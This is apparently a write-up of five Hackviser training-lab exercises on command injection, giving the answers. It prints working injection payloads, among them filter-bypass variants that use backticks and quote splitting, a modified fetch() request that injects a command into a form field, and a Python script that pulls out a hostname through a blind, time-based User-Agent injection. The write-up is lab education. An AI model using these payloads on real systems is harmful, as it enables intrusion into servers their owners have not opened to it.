---
title: 'Command Injection'
date: '2026-03-01'
excerpt: 'Practice Command Injection attacks in multiple lab exercises.'
prog: 'Hackviser Web Application Security Labs  -  March 2026'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Command Injection</h1>
<div class="writeup-date">March 2026 · Web Application Security Labs</div>
</div>
</div>
<p class="lead mb-4">Practice command injection attacks in multiple lab exercises.</p>

<h5 class="mb-2"><strong>1. Basic Command Injection</strong></h5>
<p class="mb-3">This lab contains a Command Injection vulnerability that leads to remote command execution. The web application gives the domain name you want to check as a parameter to the "nslookup" utility running on the terminal. Find a way to run a command on the system. What is the hostname address of the server where the website is running?</p>
<p class="mb-3">The page shows a DNS lookup functionality.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_cmdinjection/cmdinjection_hackviser_image1.png" alt="Web Application Security Command Injection 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">To smuggle a command while we enter a domain name, we use the payload <code>google.com; hostname</code>. Then scroll down and see the server's hostname on the screen.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_cmdinjection/cmdinjection_hackviser_image2.png" alt="Web Application Security Command Injection 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> squirrel</p>
<br />

<h5 class="mb-2"><strong>2. Command Injection Filter Bypass</strong></h5>
<p class="mb-3">This lab contains a Command Injection vulnerability that leads to remote command execution. The web application gives the domain name you want to check as a parameter to the "nslookup" utility running on the terminal. If the domain name you are sending contains common commands or operators, your query will be blocked. Find a way to run a command on the system. What is the hostname address of the server where the website is running?</p>
<p class="mb-3">We get a similar looking DNS Lookup web application like in the previous task. To bypass the filter, we use <code>google.com`hostname`</code>. The server's hostname will be appended to the output message.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_cmdinjection/cmdinjection_hackviser_image3.png" alt="Web Application Security Command Injection 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> legend</p>
<br />

<h5 class="mb-2"><strong>3. Command Injection Improved Filter Bypass</strong></h5>
<p class="mb-3">This lab contains a Command Injection vulnerability that leads to remote command execution. The web application gives the domain name you want to check as a parameter to the "nslookup" utility running on the terminal. If the domain name you are sending contains commands or operators, your query will be blocked. You should know that almost all commands are ignored. Find a way to run a command on the system. What is the hostname address of the server where the website is running?</p>
<p class="mb-3">We use the payload <code>google.com|h'o'stname</code> in the input field.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_cmdinjection/cmdinjection_hackviser_image4.png" alt="Web Application Security Command Injection 4" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> mutuality</p>
<br />

<h5 class="mb-2"><strong>4. Command Injection in Perl-Based Stock Control System</strong></h5>
<p class="mb-3">This lab contains a Command Injection vulnerability that leads to remote command execution. The web application checks stock for products with a script written in Perl. Find a way to run commands on the system. What is the hostname address of the server where the website is running?</p>
<p class="mb-3">The application has the following dropdown. To test it out, we select Nikon D3500 and click Check.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_cmdinjection/cmdinjection_hackviser_image5.png" alt="Web Application Security Command Injection 5" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">The number of products in stock returned is 30.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_cmdinjection/cmdinjection_hackviser_image6.png" alt="Web Application Security Command Injection 6" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">In the Network tab in DevTools, we need to copy the HTTP POST request we sent earlier as Fetch, so we can modify it in the Console.</p>

```JavaScript
fetch("https://tight-jackpot.europe1.hackviser.space/", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "https://tight-jackpot.europe1.hackviser.space/",
  "body": "search=nikon-d3500;hostname",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```

<p class="mb-3">Notice how we append <code>;hostname</code> to the <code>"body": "search=nikon-d3500",</code> as seen in the Fetch request above. We then press Enter, and click on the URL that appears in the Console. Since our DevTools is currently open in the browser, accessing the new URL will be recorded in the Network tab. Previewing the latest HTTP POST request in the Network tab will show us the hostname.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_cmdinjection/cmdinjection_hackviser_image7.png" alt="Web Application Security Command Injection 7" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> brilliance</p>
<br />

<h5 class="mb-2"><strong>5. Command Injection via User-Agent Log Entries</strong></h5>
<p class="mb-3">This lab contains a Command Injection vulnerability that leads to remote command execution. The web application logs the User Agent information of visiting users in a log file. Find a way to execute commands on the system. What is the hostname address of the server where the website is running?</p>

<p class="mb-3">Since the application processes the <code>User-Agent</code> header server-side without reflecting <code>stdout</code> or <code>stderr</code> in the HTTP response, classic in-band exploitation is impossible. Data cannot be read directly from the page; instead, we must rely on side channels like request timing or external network interactions to infer execution. We have to shift to a conditional time-based approach to leak data. By embedding a conditional statement that triggers a sleep command only when a specific character match is correct, we could systematically reconstruct the server's hostname character by character.</p>
<p class="mb-3">Manually brute-forcing a string character by character is highly inefficient. To optimize the data extraction process, we can automate the exfiltration using a Python script. The script systematically iterates through each string index and candidate character, dispatches the payload via an HTTP request, and flags any response latency exceeding 4.5 seconds as a successful match.</p>

```Python
import requests
import string
import time

url = "[target_URL]"
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "-_"
hostname = ""

for pos in range(1, 20):  
    for c in chars:
        ua = f"'$( [ \"$(hostname | cut -c{pos})\" = \"{c}\" ] && sleep 5 )'"
        start = time.time()
        requests.get(url, headers={"User-Agent": ua})
        delta = time.time() - start
        if delta > 4.5: 
            hostname += c
            print(f"Found: {hostname}")
            break
```

<p class="mb-3">The following is seen in the terminal when we run the Python script.</p>

```Bash
user@linux:~$ python3 script.py
Found: a
Found: ar
Found: arc
Found: arca
Found: arcan
Found: arcane
```

<p class="mb-5"><strong>Answer:</strong> arcane</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">March 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>